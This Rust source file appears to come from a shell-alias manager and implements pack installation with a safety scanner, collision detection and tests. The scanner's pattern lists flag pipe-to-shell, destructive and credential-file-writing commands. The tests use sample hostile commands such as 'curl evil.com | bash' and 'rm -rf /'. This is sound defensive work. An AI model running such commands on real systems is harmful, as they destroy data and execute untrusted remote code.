use std::fs;
use std::path::{Path, PathBuf};

use thiserror::Error;

use crate::model::{AliasRecord, AliasShell, AliasSource};
use crate::pack_manager::{
    create_pack, get_pack_aliases_path, get_pack_dir, load_pack_aliases, load_pack_manifest,
    pack_exists, save_pack_aliases,
};
use crate::pack_manager::{PackExport, PackError};
use crate::pack_registry::{PackRegistry, RegistryEntry};
use crate::store::AliasStore;

#[derive(Debug, Error)]
pub enum InstallError {
     #[error("Pack file not found: {0}")]
    FileNotFound(String),

     #[error("Invalid pack format: {0}")]
    InvalidFormat(String),

     #[error("Download failed: {0}")]
    DownloadFailed(String),

     #[error("Safety check failed: {0}")]
    SafetyViolation(String),

     #[error("IO error: {0}")]
    Io(#[from] std::io::Error),

     #[error("TOML error: {0}")]
    Toml(#[from] toml::de::Error),

     #[error("Registry error: {0}")]
    Registry(#[from] crate::pack_registry::RegistryError),

      #[error("Pack error: {0}")]
    Pack(#[from] crate::pack_manager::PackError),

       #[error("Manifest error: {0}")]
    Manifest(#[from] crate::pack_manifest::ManifestError),
}

/// Categories of dangerous patterns detected during pack install
#[derive(Debug, Clone)]
pub enum SafetyWarning {
    CommandSubstitution(String),
    PipeToShell(String),
    DestructiveCommand(String),
    NetworkAccess(String),
    SensitiveFileWrite(String),
}

impl SafetyWarning {
    pub fn description(&self) -> &str {
        match self {
            SafetyWarning::CommandSubstitution(_) => "Contains command substitution $() or `",
            SafetyWarning::PipeToShell(_) => "Pipes output to shell interpreter",
            SafetyWarning::DestructiveCommand(_) => "Contains potentially destructive commands",
            SafetyWarning::NetworkAccess(_) => "Makes network requests",
            SafetyWarning::SensitiveFileWrite(_) => "Writes to sensitive system files",
         }
     }

    pub fn alias_name(&self) -> &str {
        match self {
            SafetyWarning::CommandSubstitution(n) => n,
            SafetyWarning::PipeToShell(n) => n,
            SafetyWarning::DestructiveCommand(n) => n,
            SafetyWarning::NetworkAccess(n) => n,
            SafetyWarning::SensitiveFileWrite(n) => n,
         }
     }
}

/// Scan a pack's aliases for dangerous command patterns
/// Returns a list of warnings found (empty if pack is safe)
pub fn scan_pack_safety(aliases: &[AliasRecord]) -> Vec<SafetyWarning> {
    let mut warnings = Vec::new();

    // Patterns that indicate command substitution
    let cmd_sub_patterns = ["$(", "`"];
    // Patterns that pipe to shell
    let pipe_shell_patterns = ["| bash", "| sh", "| zsh", "| csh", "| ksh"];
    // Destructive commands
    let destructive_patterns = [
         "rm -rf ", "rm -f /", "dd if=", "mkfs", "fdisk",
         "format", "diskutil erase",
     ];
    // Network access commands
    let network_patterns = [
         "curl http", "curl https", "wget http", "wget https",
         "curl -o ", "curl -O ",
     ];
    // Sensitive file writes
    let sensitive_patterns = [
         "> /etc/", "> ~/.ssh/", "> /usr/", "tee /etc/",
         "tee ~/.ssh/",
     ];

    for alias in aliases {
         // Check command substitution
        for pat in &cmd_sub_patterns {
            if alias.command.contains(pat) {
                warnings.push(SafetyWarning::CommandSubstitution(alias.name.clone()));
                break;
             }
         }

         // Check pipe to shell
        for pat in &pipe_shell_patterns {
            if alias.command.contains(pat) {
                warnings.push(SafetyWarning::PipeToShell(alias.name.clone()));
                break;
             }
         }

         // Check destructive commands
        for pat in &destructive_patterns {
            if alias.command.contains(pat) {
                warnings.push(SafetyWarning::DestructiveCommand(alias.name.clone()));
                break;
             }
         }

         // Check network access
        for pat in &network_patterns {
            if alias.command.contains(pat) {
                warnings.push(SafetyWarning::NetworkAccess(alias.name.clone()));
                break;
             }
         }

         // Check sensitive file writes
        for pat in &sensitive_patterns {
            if alias.command.contains(pat) {
                warnings.push(SafetyWarning::SensitiveFileWrite(alias.name.clone()));
                break;
             }
         }
     }

    warnings
}

/// Check for name collisions between pack aliases and existing user aliases
/// Returns list of (alias_name, existing_command, pack_command) tuples
pub fn detect_collisions(
    pack_aliases: &[AliasRecord],
    user_store: &AliasStore,
) -> Vec<(String, String, String)> {
    let mut collisions = Vec::new();

    for pack_alias in pack_aliases {
        if let Some(user_alias) = user_store.aliases.iter().find(|a| a.name == pack_alias.name) {
            // Only flag if user alias is User or Imported (not Pack-sourced)
            match user_alias.source {
                AliasSource::User | AliasSource::Imported => {
                    collisions.push((
                        pack_alias.name.clone(),
                        user_alias.command.clone(),
                        pack_alias.command.clone(),
                     ));
                 }
                _ => {}
             }
         }
     }

    collisions
}

/// Preview of what pack install will do (before applying)
pub struct InstallPreview {
    pub pack_name: String,
    pub pack_version: String,
    pub pack_description: Option<String>,
    pub alias_count: usize,
    pub warnings: Vec<SafetyWarning>,
    pub collisions: Vec<(String, String, String)>,
    pub source: String,
}

impl InstallPreview {
    pub fn display(&self) {
        println!("═══ pack install preview ═══");
        println!("Pack: {} v{}", self.pack_name, self.pack_version);
        if let Some(ref desc) = self.pack_description {
            println!("Description: {}", desc);
         }
        println!("Source: {}", self.source);
        println!("Aliases to install: {}", self.alias_count);

        if !self.warnings.is_empty() {
            println!("\n⚠️  Safety warnings ({}):", self.warnings.len());
            for w in &self.warnings {
                println!("    [WARN] {} — {}", w.alias_name(), w.description());
             }
            println!("  Use --force to install despite warnings.");
         }

        if !self.collisions.is_empty() {
            println!("\n⚠️  Name collisions ({}):", self.collisions.len());
            for (name, user_cmd, pack_cmd) in &self.collisions {
                println!("    [COLLISION] {}", name);
                println!("      User:  {}", user_cmd);
                println!("      Pack:  {}", pack_cmd);
                println!("      → User alias preserved (use --force to override)");
             }
         }
     }
}

/// Parse a pack export TOML file and return the data
pub fn parse_pack_file(path: &Path) -> Result<PackExport, InstallError> {
    let content = fs::read_to_string(path)
          .map_err(|e| InstallError::FileNotFound(format!("{}: {}", path.display(), e)))?;
    let export: PackExport = toml::from_str(&content)?;
    Ok(export)
}

/// Download a pack from a URL and return the TOML content
pub async fn download_pack(url: &str) -> Result<String, InstallError> {
    let resp = reqwest::get(url)
          .await
          .map_err(|e| InstallError::DownloadFailed(format!("{}: {}", url, e)))?;

    if !resp.status().is_success() {
        return Err(InstallError::DownloadFailed(format!(
             "HTTP {} downloading {}", resp.status(), url
         )));
     }

    let content = resp.text()
          .await
          .map_err(|e| InstallError::DownloadFailed(format!("Reading response: {}", e)))?;
    Ok(content)
}

/// Create an install preview by analyzing a pack export against the user's store
pub fn create_install_preview(
    export: &PackExport,
    user_store: &AliasStore,
    source: String,
) -> InstallPreview {
    let warnings = scan_pack_safety(&export.aliases);
    let collisions = detect_collisions(&export.aliases, user_store);

    InstallPreview {
        pack_name: export.manifest.name.clone(),
        pack_version: export.manifest.version.clone(),
        pack_description: export.manifest.description.clone(),
        alias_count: export.aliases.len(),
        warnings,
        collisions,
        source,
     }
}

/// Install a pack from a PackExport into the packs directory and registry.
///
/// Two-phase: validates all aliases first, then writes everything atomically.
/// Skips aliases that collide with user aliases unless force is true.
pub fn install_pack(
    export: PackExport,
    force: bool,
    user_store: &AliasStore,
    source: String,
) -> Result<InstallResult, InstallError> {
    let preview = create_install_preview(&export, user_store, source.clone());

     // Block install if safety warnings exist (unless --force)
    if !preview.warnings.is_empty() && !force {
        return Err(InstallError::SafetyViolation(
             "Pack contains dangerous patterns. Use --force to override.".to_string(),
         ));
     }

    let pack_name = export.manifest.name.clone();

     // Phase 1: Validate all aliases
    for alias in &export.aliases {
        if alias.name.is_empty() {
            return Err(InstallError::InvalidFormat(
                 "Alias has empty name".to_string(),
             ));
         }
        if alias.command.is_empty() {
            return Err(InstallError::InvalidFormat(
                 format!("Alias '{}' has empty command", alias.name),
             ));
         }
     }

     // Phase 2: Apply - create pack directory with manifest and aliases
    if pack_exists(&pack_name) {
         // Update existing pack
        let pack_dir = get_pack_dir(&pack_name)?;
        export.manifest.save_to_path(&pack_dir.join("pack.toml"))?;
     } else {
         // Create new pack
        create_pack(
            export.manifest.name.clone(),
            export.manifest.version.clone(),
            export.manifest.description.clone(),
            export.manifest.author.clone(),
         ).map_err(|e| InstallError::Io(std::io::Error::new(
            std::io::ErrorKind::Other,
             format!("Failed to create pack: {}", e),
         )))?;
     }

     // Filter out colliding aliases (user wins unless force)
    let mut final_aliases = Vec::new();
    let mut skipped_collisions = Vec::new();

    for mut alias in export.aliases {
        let is_collision = user_store.aliases.iter().any(|a| {
            a.name == alias.name && matches!(a.source, AliasSource::User | AliasSource::Imported)
         });

        if is_collision && !force {
            skipped_collisions.push(alias.name.clone());
         } else {
             // Ensure source is set to Pack
            alias.source = AliasSource::Pack(pack_name.clone());
            final_aliases.push(alias);
         }
     }

     // Write aliases to pack directory
    save_pack_aliases(&pack_name, &final_aliases)?;

     // Update registry
    let mut registry = PackRegistry::load()?;
    registry.register_pack(
        pack_name.clone(),
        export.manifest.version.clone(),
        source,
        final_aliases.len(),
     );
    registry.save()?;

    Ok(InstallResult {
        pack_name,
        installed_count: final_aliases.len(),
        skipped_collisions,
        had_warnings: !preview.warnings.is_empty(),
     })
}

/// Result of a successful pack installation
pub struct InstallResult {
    pub pack_name: String,
    pub installed_count: usize,
    pub skipped_collisions: Vec<String>,
    pub had_warnings: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

     fn make_alias(name: &str, cmd: &str) -> AliasRecord {
        AliasRecord {
            name: name.to_string(),
            command: cmd.to_string(),
            description: None,
            tags: vec![],
            shell: AliasShell::All,
            source: AliasSource::Pack("test".to_string()),
            created_at: 0,
            updated_at: 0,
    modified_by_user: false,
         }
     }

     fn make_user_alias(name: &str, cmd: &str) -> AliasRecord {
        AliasRecord {
            name: name.to_string(),
            command: cmd.to_string(),
            description: None,
            tags: vec![],
            shell: AliasShell::All,
            source: AliasSource::User,
            created_at: 0,
            updated_at: 0,
    modified_by_user: false,
         }
     }

     #[test]
    fn scan_safe_aliases_returns_no_warnings() {
        let aliases = vec![
            make_alias("gs", "git status"),
            make_alias("ll", "ls -la"),
         ];
        let warnings = scan_pack_safety(&aliases);
        assert!(warnings.is_empty());
     }

     #[test]
    fn scan_detects_command_substitution() {
        let aliases = vec![make_alias("danger", "echo $(whoami)")];
        let warnings = scan_pack_safety(&aliases);
        assert_eq!(warnings.len(), 1);
        assert!(matches!(warnings[0], SafetyWarning::CommandSubstitution(_)));
     }

     #[test]
    fn scan_detects_pipe_to_shell() {
        let aliases = vec![make_alias("danger", "curl evil.com | bash")];
        let warnings = scan_pack_safety(&aliases);
        assert!(warnings.iter().any(|w| matches!(w, SafetyWarning::PipeToShell(_))));
     }

     #[test]
    fn scan_detects_destructive_commands() {
        let aliases = vec![make_alias("danger", "rm -rf /")];
        let warnings = scan_pack_safety(&aliases);
        assert!(warnings.iter().any(|w| matches!(w, SafetyWarning::DestructiveCommand(_))));
     }

     #[test]
    fn detect_collisions_finds_user_conflicts() {
        let pack_aliases = vec![
            make_alias("gs", "git status -s"),
            make_alias("new", "echo new"),
         ];
        let store = AliasStore {
            aliases: vec![
                make_user_alias("gs", "git status"),
                make_user_alias("other", "echo other"),
             ],
         };

        let collisions = detect_collisions(&pack_aliases, &store);
        assert_eq!(collisions.len(), 1);
        assert_eq!(collisions[0].0, "gs");
     }

     #[test]
    fn detect_collisions_no_conflict_for_different_names() {
        let pack_aliases = vec![make_alias("unique", "echo unique")];
        let store = AliasStore {
            aliases: vec![make_user_alias("other", "echo other")],
         };

        let collisions = detect_collisions(&pack_aliases, &store);
        assert!(collisions.is_empty());
     }
}
